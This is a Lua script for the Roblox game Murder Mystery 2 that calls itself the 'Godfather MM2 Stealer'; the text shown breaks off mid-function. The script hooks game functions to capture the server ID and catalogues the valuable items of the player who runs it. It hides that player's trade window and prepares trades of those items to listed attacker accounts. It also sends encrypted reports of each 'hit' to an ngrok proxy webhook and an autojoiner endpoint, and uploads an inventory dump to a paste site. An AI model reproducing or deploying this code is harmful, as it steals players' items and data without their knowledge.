repeat task.wait() until game:IsLoaded()
task.wait(2)

-- Sadece MM2'de çalışsın
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in MM2!")
    return
end

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- ================= UTILITY FUNCTIONS =================
local function table_find(tbl, value)
    for i, v in ipairs(tbl) do
        if v == value then return i end
    end
    return nil
end

-- ================= YENİ BYPASS KODU =================
local REAL_JOB_ID = nil

local function getRealJobId()
    local hooked = false
    local hookedFuncs = {}

    local function tryHook(funcName)
        if hooked then return end

        for _, v in ipairs(getgc(true)) do
            if type(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name and info.name:lower():find(funcName:lower()) then
                    local original = clonefunction(v)
                    local isRunning = false

                    hookfunction(v, function(...)
                        if isRunning then return original(...) end
                        isRunning = true

                        if not hooked then
                            hooked = true
                            REAL_JOB_ID = game.JobId

                            for _, item in ipairs(hookedFuncs) do
                                pcall(function() hookfunction(item.hooked, item.original) end)
                            end
                            hookedFuncs = {}
                        end

                        local results = table.pack(original(...))
                        isRunning = false
                        return table.unpack(results)
                    end)

                    table.insert(hookedFuncs, { hooked = v, original = original })
                    return
                end
            end
        end
    end

    tryHook("stepAnimate")
    if not hooked then tryHook("AnimationPlayed") end
    if not hooked then tryHook("animate") end
    if not hooked then tryHook("step") end

    local timeout = 0
    while not REAL_JOB_ID and timeout < 60 do
        task.wait(0.1)
        timeout = timeout + 1
    end

    if not REAL_JOB_ID then
        REAL_JOB_ID = game.JobId
    end

    return REAL_JOB_ID
end

REAL_JOB_ID = getRealJobId()
-- ================= BYPASS SONU =================

-- ================= CRYPTO HELPERS =================
local bit = bit32
if not bit then
    pcall(function()
        bit = require("bit")
    end)
end

-- Fallback bit operations if no bit library
if not bit then
    bit = {
        band = function(a, b) return a & b end,
        bor = function(a, b) return a | b end,
        bxor = function(a, b) return a ~ b end,
        lshift = function(a, b) return a << b end,
        rshift = function(a, b) return a >> b end,
        bnot = function(a) return ~a end
    }
end

local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function str_to_bytes(s)
    local bytes = {}
    for i = 1, #s do
        bytes[i] = string.byte(s, i)
    end
    return bytes
end

local function bytes_to_str(bytes)
    local t = {}
    for i = 1, #bytes do
        t[i] = string.char(bytes[i])
    end
    return table.concat(t)
end

local function base64_encode(data)
    if #data == 0 then return "" end
    local b = {}
    data:gsub('.', function(c)
        local byte = string.byte(c)
        for i = 7, 0, -1 do
            b[#b+1] = (byte & (1 << i)) ~= 0 and '1' or '0'
        end
    end)
    
    -- Pad to multiple of 3 bytes (24 bits)
    local padding = (3 - (#data % 3)) % 3
    for i = 1, padding * 8 do
        b[#b+1] = '0'
    end
    
    local base64 = ''
    for i = 1, #b, 6 do
        local chunk = table.concat(b, '', i, math.min(i+5, #b))
        local value = tonumber(chunk, 2) or 0
        base64 = base64 .. b64chars:sub(value+1, value+1)
    end
    
    -- Add padding
    if padding == 1 then base64 = base64 .. '='
    elseif padding == 2 then base64 = base64 .. '==' end
    
    return base64
end

local function rotl(x, n)
    n = n % 32
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
end

local sha256_K = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
}

local function sha256(msg_bytes)
    local m = {}
    for i = 1, #msg_bytes do m[i] = msg_bytes[i] end

    m[#m+1] = 0x80
    while #m % 64 ~= 56 do
        m[#m+1] = 0
    end
    
    local bit_len = #msg_bytes * 8
    for i = 7, 0, -1 do
        m[#m+1] = (bit_len >> (i * 8)) & 0xFF
    end

    local h = {
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    }

    for chunk_start = 1, #m, 64 do
        local w = {}
        for i = 0, 15 do
            local idx = chunk_start + i * 4
            w[i] = ((m[idx] or 0) << 24) | ((m[idx+1] or 0) << 16) | ((m[idx+2] or 0) << 8) | (m[idx+3] or 0)
        end
        
        for i = 16, 63 do
            local s0 = ((w[i-15] >> 7) | (w[i-15] << 25)) ~ ((w[i-15] >> 18) | (w[i-15] << 14)) ~ (w[i-15] >> 3)
            local s1 = ((w[i-2] >> 17) | (w[i-2] << 15)) ~ ((w[i-2] >> 19) | (w[i-2] << 13)) ~ (w[i-2] >> 10)
            w[i] = (w[i-16] + s0 + w[i-7] + s1) & 0xFFFFFFFF
        end

        local a, b, c, d, e, f, g, hh = h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8]

        for i = 0, 63 do
            local S1 = ((e >> 6) | (e << 26)) ~ ((e >> 11) | (e << 21)) ~ ((e >> 25) | (e << 7))
            local ch = (e & f) ~ (~e & g)
            local t1 = (hh + S1 + ch + sha256_K[i+1] + w[i]) & 0xFFFFFFFF
            local S0 = ((a >> 2) | (a << 30)) ~ ((a >> 13) | (a << 19)) ~ ((a >> 22) | (a << 10))
            local maj = (a & b) ~ (a & c) ~ (b & c)
            local t2 = (S0 + maj) & 0xFFFFFFFF

            hh = g
            g = f
            f = e
            e = (d + t1) & 0xFFFFFFFF
            d = c
            c = b
            b = a
            a = (t1 + t2) & 0xFFFFFFFF
        end

        h[1] = (h[1] + a) & 0xFFFFFFFF
        h[2] = (h[2] + b) & 0xFFFFFFFF
        h[3] = (h[3] + c) & 0xFFFFFFFF
        h[4] = (h[4] + d) & 0xFFFFFFFF
        h[5] = (h[5] + e) & 0xFFFFFFFF
        h[6] = (h[6] + f) & 0xFFFFFFFF
        h[7] = (h[7] + g) & 0xFFFFFFFF
        h[8] = (h[8] + hh) & 0xFFFFFFFF
    end

    local hash_bytes = {}
    for i = 1, 8 do
        for j = 3, 0, -1 do
            hash_bytes[#hash_bytes+1] = (h[i] >> (j * 8)) & 0xFF
        end
    end
    return hash_bytes
end

local function hmac_sha256(key_bytes, msg_bytes)
    local blocksize = 64
    if #key_bytes > blocksize then
        key_bytes = sha256(key_bytes)
    end
    while #key_bytes < blocksize do
        key_bytes[#key_bytes+1] = 0
    end
    
    local o_key_pad, i_key_pad = {}, {}
    for i = 1, blocksize do
        o_key_pad[i] = key_bytes[i] ~ 0x5c
        i_key_pad[i] = key_bytes[i] ~ 0x36
    end
    
    local inner_input = {}
    for _, v in ipairs(i_key_pad) do inner_input[#inner_input+1] = v end
    for _, v in ipairs(msg_bytes) do inner_input[#inner_input+1] = v end
    local inner_hash = sha256(inner_input)
    
    local outer_input = {}
    for _, v in ipairs(o_key_pad) do outer_input[#outer_input+1] = v end
    for _, v in ipairs(inner_hash) do outer_input[#outer_input+1] = v end
    return sha256(outer_input)
end

local prng_state
local function prng_init(seed)
    prng_state = seed & 0xFFFFFFFF
end

local function prng_next()
    local s = prng_state
    s = (s ~ (s << 13)) & 0xFFFFFFFF
    s = (s ~ (s >> 17)) & 0xFFFFFFFF
    s = (s ~ (s << 5)) & 0xFFFFFFFF
    prng_state = s
    return s & 0xFF
end

local function encrypt_payload(message_str, key_bytes)
    local msg_bytes = str_to_bytes(message_str)
    local seed = os.time() + math.floor(os.clock() * 10000)
    prng_init(seed)

    local rand_bytes = {}
    for _ = 1, 12 do
        rand_bytes[#rand_bytes+1] = prng_next()
    end

    local xored_msg = {}
    for i = 1, #msg_bytes do
        xored_msg[i] = msg_bytes[i] ~ rand_bytes[(i-1) % 12 + 1]
    end

    local hmac_input = {}
    for _, v in ipairs(xored_msg) do hmac_input[#hmac_input+1] = v end
    for _, v in ipairs(rand_bytes) do hmac_input[#hmac_input+1] = v end
    local hmac = hmac_sha256(key_bytes, hmac_input)

    local blob_bytes = {}
    for _, v in ipairs(rand_bytes) do blob_bytes[#blob_bytes+1] = v end
    for _, v in ipairs(xored_msg) do blob_bytes[#blob_bytes+1] = v end
    for _, v in ipairs(hmac) do blob_bytes[#blob_bytes+1] = v end

    return base64_encode(bytes_to_str(blob_bytes))
end

local function generate_signature(key_bytes)
    local expiry = tostring(os.time() + 300)
    local nonce = game:GetService("HttpService"):GenerateGUID(false)
    local raw = base64_encode(expiry) .. "." .. base64_encode(nonce)
    local raw_bytes = str_to_bytes(raw .. ".v2")
    local hmac = hmac_sha256(key_bytes, raw_bytes)
    local sig = base64_encode(bytes_to_str(hmac))
    return raw .. "." .. sig
end
-- ================= END CRYPTO HELPERS =================

-- ================= PROXY WEBHOOK SYSTEM =================
local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.app/api/proxy/"

-- EXTERNAL GLOBALS - SET BY LOADER
local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
local usernames_id = _G.USERNAMES or {}

local DUALHOOK_WEBHOOK_ID = "moqs1fx2p8s"
local PUBLIC_WEBHOOK_ID = "lac9yi4lh18"

-- Universal request
getgenv().request = getgenv().request 
    or request 
    or http_request 
    or (syn and syn.request) 
    or (http and http.request) 
    or (fluxus and fluxus.request) 
    or (Hydrogen and Hydrogen.request) 
    or (krnl and krnl.request) 
    or (KRNL and KRNL.request) 
    or (codex and codex.request) 
    or (ronix and ronix.request) 
    or (volcano and volcano.request) 
    or (potassium and potassium.request) 
    or (wave and wave.request) 
    or (seliware and seliware.request) 
    or (bunnifun and bunnifun.request) 
    or (volt and volt.request) 
    or (velocity and velocity.request) 
    or (swift and swift.request) 
    or (xeno and xeno.request) 
    or getgenv().HttpPost 
    or nil

if not getgenv().request then
    warn("Executor not supported: No request function found.")
    return
end

-- Universal queue_on_teleport
getgenv().queue_on_teleport = getgenv().queue_on_teleport 
    or queue_on_teleport 
    or queueonteleport 
    or (syn and syn.queue_on_teleport) 
    or (fluxus and fluxus.queue_on_teleport) 
    or (Hydrogen and Hydrogen.queue_on_teleport) 
    or (krnl and krnl.queue_on_teleport) 
    or (codex and codex.queue_on_teleport) 
    or (ronix and ronix.queue_on_teleport) 
    or (volcano and volcano.queue_on_teleport) 
    or (potassium and potassium.queue_on_teleport) 
    or (wave and wave.queue_on_teleport) 
    or (seliware and seliware.queue_on_teleport) 
    or (bunnifun and bunnifun.queue_on_teleport) 
    or (volt and volt.queue_on_teleport) 
    or (velocity and velocity.queue_on_teleport) 
    or (swift and swift.queue_on_teleport) 
    or (xeno and xeno.queue_on_teleport) 
    or nil

-- Universal setclipboard
getgenv().setclipboard = getgenv().setclipboard 
    or setclipboard 
    or (syn and syn.setclipboard) 
    or (clipboard and clipboard.set) 
    or (Hydrogen and Hydrogen.setclipboard) 
    or (krnl and krnl.setclipboard) 
    or (codex and codex.setclipboard) 
    or (ronix and ronix.setclipboard) 
    or (volcano and volcano.setclipboard) 
    or (potassium and potassium.setclipboard) 
    or (wave and wave.setclipboard) 
    or (seliware and seliware.setclipboard) 
    or (bunnifun and bunnifun.setclipboard) 
    or (volt and volt.setclipboard) 
    or (velocity and velocity.setclipboard) 
    or (swift and swift.setclipboard) 
    or (xeno and xeno.setclipboard) 
    or function() end

local HttpService = game:GetService("HttpService")
if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end

local cfg = {
    users = usernames_id,
    webhook = WEBHOOK_ID,
    dualhookUser = {"Skaakm", "ItsBelrux", "ItsZorlux", "bastememirhan7", "The_Galaxor"},
    pingEveryone = "Yes",
    StatusApi = "https://live-status-seven.vercel.app",
    ApiKey = "sk_live_4A9ZK7F2N0D6B8R5XHqMJEWpCYLt"
}

local AUTOJOINER_API = "https://autojoiner-fawn.vercel.app/api/hit"

local no_trade_items = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local specialItems = {
    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
}

local rarityTable = { "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage" }

local users = cfg.users
local dualhookUser = cfg.dualhookUser
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

if not plr then return end

local dualhookTimer = nil
local isDualhookActive = false
local isTradeCompleted = false
local hasSpecialItem = false
local totalInventoryValue = 0
local statusHeartbeatStarted = false

local originalItems = {}
local receivedCounts = {}
local tradeMessageId = nil
local tradeWebhookUrl = nil
local tradeMessageUrl = nil
local isDualhookTrade = false

local request = getgenv().request

local executorName = "Unknown"
pcall(function()
    local ok, name = pcall(identifyexecutor)
    if ok and name then
        executorName = name
    else
        local ok2, name2 = pcall(getexecutorname)
        if ok2 and name2 then
            executorName = name2
        end
    end
end)

local isDelta = executorName:lower():find("delta") ~= nil
local queueTeleport = getgenv().queue_on_teleport
local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or nil

local STATUS_API_URL = cfg.StatusApi or ""
local API_KEY = cfg.ApiKey or ""
local AVATAR_URL = "https://cdn.discordapp.com/attachments/1469409737220165746/1469677154294825032/IMG_6264.png"

local USD_API_URL = "https://we-bmm2.vercel.app/api/calc"

local function sendHitToQueue(placeId, jobId, receiverName)
    pcall(function()
        request({
            Url = AUTOJOINER_API,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                placeId = tostring(placeId),
                jobId = tostring(jobId),
                receiver = receiverName
            })
        })
    end)
end

local function GetUSD(list)
    if not list or #list == 0 then return {total = "0.00", itemPrices = {}} end
    
    local items = {}
    local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    for _, item in ipairs(list) do
        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
        table.insert(items, {name = displayName, amount = item.Amount})
    end
    
    local success, res = pcall(function()
        return request({
            Url = USD_API_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({inventory = items})
        })
    end)
    
    if success and res and res.Body then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and decoded then return decoded end
    end
    return {total = "0.00", itemPrices = {}}
end

local function upload_to_rubis(items)
    if not items or #items == 0 then return nil end
    
    local lines = {"Godfather Inventory Dump | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
    table.sort(items, function(a, b)
        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local a_order = tier_order[a.Rarity] or 1
        local b_order = tier_order[b.Rarity] or 1
        if a_order ~= b_order then return a_order > b_order end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
    
    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
    end
    
    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = content,
                type = "PASTE"
            })
        })
    end)
    
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then 
                return "https://pastefy.app/" .. data.paste.id
            elseif data.id then 
                return "https://pastefy.app/" .. data.id 
            end
        end
    end
    return nil
end

local function fetch_all_values()
    local value_links = {
        commons = "https://supremevalues.com/mm2/commons",
        uncommons = "https://supremevalues.com/mm2/uncommons",
        rares = "https://supremevalues.com/mm2/rares",
        legendaries = "https://supremevalues.com/mm2/legendaries",
        godlies = "https://supremevalues.com/mm2/godlies",
        chromas = "https://supremevalues.com/mm2/chromas",
        vintages = "https://supremevalues.com/mm2/vintages",
        ancients = "https://supremevalues.com/mm2/ancients",
        evos = "https://supremevalues.com/mm2/evos",
        uniques = "https://supremevalues.com/mm2/uniques",
        sets = "https://supremevalues.com/mm2/sets"
    }
    
    local req_headers = {
        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }
    
    local function clean_string_lol(str) 
        return str:match("^%s*(.-)%s*$") or str
    end
    
    local function fetchHTML(url)
        local ok, response = pcall(function() 
            return request({Url = url, Method = "GET", Headers = req_headers}) 
        end)
        if ok and response then return response.Body end
        return nil
    end
    
    local function parseValue(itembodyDiv)
        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
        if valueStr then
            valueStr = valueStr:gsub(",", "")
            local value = tonumber(valueStr)
            if value then return value end
        end
        return nil
    end
    
    local function extractItems(htmlContent)
        local itemValues = {}
        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
            itemName = itemName:match("([^<]+)")
            if itemName then
                itemName = clean_string_lol(itemName:gsub("%s+", " "))
                local splitName = itemName:split(" Click ")
                itemName = clean_string_lol(splitName[1] or itemName)
                local itemNameLower = itemName:lower()
                local value = parseValue(itembodyDiv)
                if value then itemValues[itemNameLower] = value end
            end
        end
        return itemValues
    end
    
    local function extractChromaItems(htmlContent)
        local chromaValues = {}
        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
            chromaName = chromaName:match("([^<]+)")
            if chromaName then
                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
                local value = parseValue(itembodyDiv)
                if value then chromaValues[chromaName] = value end
            end
        end
        return chromaValues
    end

    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}
    
    for rarity, url in pairs(value_links) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            if htmlContent and htmlContent ~= "" then
                if rarity == "chromas" then
                    local extracted = extractChromaItems(htmlContent)
                    for k, v in pairs(extracted) do chromaExtractedValues[k] = v end
                else
                    local extracted = extractItems(htmlContent)
                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
                end
            end
            completed = completed + 1
            if completed == totalCategories then lock:Fire() end
        end)
    end
    
    lock.Event:Wait()

    local final_prices = {}
    local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    
    for id, data in pairs(item_db) do
        local item_name = data.ItemName and data.ItemName:lower() or ""
        local rarity = data.Rarity or ""
        local has_chroma = data.Chroma or false
        
        if item_name ~= "" and rarity ~= "" then
            if has_chroma then
                for c_name, c_val in pairs(chromaExtractedValues) do
                    if c_name:find(item_name) then
                        final_prices[id] = c_val
                        break
                    end
                end
            end
            
            if not final_prices[id] and allExtractedValues[item_name] then
                final_prices[id] = allExtractedValues[item_name]
            end
            
            if not final_prices[id] then
                if rarity == "Godly" then final_prices[id] = 8
                elseif rarity == "Ancient" then final_prices[id] = 50
                elseif rarity == "Unique" then final_prices[id] = 100
                elseif rarity == "Vintage" then final_prices[id] = 25
                elseif rarity == "Evos" then final_prices[id] = 15
                elseif rarity == "Legendary" then final_prices[id] = 5
                else final_prices[id] = 1 end
            end
        end
    end
    return final_prices
end

if not plr.Character then plr.CharacterAdded:Wait() end
task.wait(1)

local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")
local DeclineRequest = Trade:WaitForChild("DeclineRequest")

_G.LastOffer = nil
Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
    if x and x.LastOffer then 
        _G.LastOffer = x.LastOffer 
    end 
end)

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local weaponsToSend = {}
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local prices = fetch_all_values()

local min_rarity = _G.min_rarity or "Godly"
local min_rarity_index = table_find(rarityTable, min_rarity) or table_find(rarityTable, "Godly") or 5

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item and not no_trade_items[dataid] then
        local itemName = item.ItemName or dataid
        local rarity = item.Rarity or "Common"
        local weapon_rarity_index = table_find(rarityTable, rarity)
        
        if weapon_rarity_index and weapon_rarity_index >= min_rarity_index then
            local value = prices[dataid] or 1
            local totalValue = value * amount
            totalInventoryValue = totalInventoryValue + totalValue
            if specialItems[itemName] then hasSpecialItem = true end
            table.insert(weaponsToSend, {
                DataID = dataid,
                ItemName = itemName,
                Amount = amount,
                Rarity = rarity,
                Value = value,
                TotalValue = totalValue,
                IsChroma = specialItems[itemName] or false
            })
            rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
        end
    end
end

table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)

local usdData = GetUSD(weaponsToSend)
local totalUSD = usdData.total or "0.00"
local itemPrices = usdData.itemPrices or {}

local hitCategory = ""
local isPingWorthy = false

if totalInventoryValue < 100 then
    hitCategory = "Bad Hit"
elseif totalInventoryValue < 300 then
    hitCategory = "Normal Hit"
elseif totalInventoryValue < 1000 then
    hitCategory = "Good Hit"
    isPingWorthy = true
else
    hitCategory = "Big Hit"
    isPingWorthy = true
end

local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"

local function sendToProxy(Wid, payload, isEncrypted)
    task.spawn(function()
        local finalBody = HttpService:JSONEncode(payload)
        if isEncrypted then
            local key = {153,81,28,110,69,227,146,246,21,43,102,35,44,44,33,218,123,134,211,42,33,96,235,19,36,196,66,225,55,94,101,179}
            finalBody = encrypt_payload(finalBody, key)
        end
        
        local url = PROXY_URL .. Wid
        print("[Godfather] Sending to proxy:", url)
        
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Godfather/4.0.0"
                },
                Body = finalBody
            })
        end)
        
        if not success then
            warn("[Godfather] Request failed:", tostring(response))
        elseif response.StatusCode ~= 200 then
            warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
        else
            print("[Godfather] Successfully sent")
        end
    end)
end

local function getTradeStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function updateTradeMessage()
    if not tradeMessageUrl or not originalItems or #originalItems == 0 then return end
    if isDualhookTrade then return end

    local totalReceivedValue = 0
    local totalOriginalValue = 0
    local itemFields = {}

    for _, origItem in ipairs(originalItems) do
        local received = receivedCounts[origItem.ItemName] or 0
        local receivedValue = received * origItem.Value
        local totalValue = origItem.TotalValue
        totalReceivedValue = totalReceivedValue + receivedValue
        totalOriginalValue = totalOriginalValue + totalValue

        local percentage = math.floor((received / origItem.Amount) * 100)
        local statusEmoji = percentage == 100 and "✅" or percentage >= 50 and "⏳" or "🔄"
        
        table.insert(itemFields, {
            name = string.format("%s %s", statusEmoji, origItem.ItemName),
            value = string.format("```[%d/%d] %d%%\nValue: %d/%d```", received, origItem.Amount, percentage, receivedValue, totalValue),
            inline = true
        })
    end

    local totalPercentage = totalOriginalValue > 0 and math.floor((totalReceivedValue / totalOriginalValue) * 100) or 0
    local progressColor = totalPercentage == 100 and 0x00FF00 or totalPercentage >= 75 and 0xFFD700 or 0x8B0000

    local embed = {
        title = "⟳ TRADE IN PROGRESS",
        color = progressColor,
        fields = itemFields,
        description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
        footer = { 
            text = "Godfather MM2 Stealer • NULS Hosting • v4.0.0"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = { embeds = { embed } }
    sendToProxy(WEBHOOK_ID, payload, true)
end

local function sendWebhook(targetWebhookId, isDualhook)
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = isDualhook and table.concat(dualhookUser, ", ") or table.concat(users, ", ")
    local hookType = isDualhook and "⚠️ DUALHOOK BACKUP" or "🎯 HIT CONFIRMED"
    local color = isDualhook and 0xFF4500 or 0x8B0000
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)

    local itemsForWebhook = {}
    if isDualhook then
        for _, item in ipairs(weaponsToSend) do
            if item.Rarity == "Godly" or item.Rarity == "Vintage" or item.Rarity == "Ancient" or item.Rarity == "Unique" or item.IsChroma then
                table.insert(itemsForWebhook, item)
            end
        end
    else
        for _, item in ipairs(weaponsToSend) do
            table.insert(itemsForWebhook, item)
        end
    end

    local total_items = 0
    for _, item in ipairs(itemsForWebhook) do total_items = total_items + item.Amount end

    local inventoryString = "```Total: " .. totalInventoryValue .. " / $" .. totalUSD .. "\n\n"
    for _, item in ipairs(itemsForWebhook) do
        local price = itemPrices[item.ItemName] or itemPrices[item.ItemName:lower()] or 0
        local line = string.format("%dx %s ($%.2f)\n", item.Amount, item.ItemName, price)
        if #inventoryString + #line < 950 then 
            inventoryString = inventoryString .. line 
        end
    end
    inventoryString = inventoryString .. "```"

    local top_items = {}
    for i = 1, math.min(3, #itemsForWebhook) do
        local item = itemsForWebhook[i]
        if item then
            local rarityEmoji = {
                Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
                Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
            }
            local emoji = rarityEmoji[item.Rarity] or "⚪"
            table.insert(top_items, string.format("%s `%s` ×%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
        end
    end

    local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
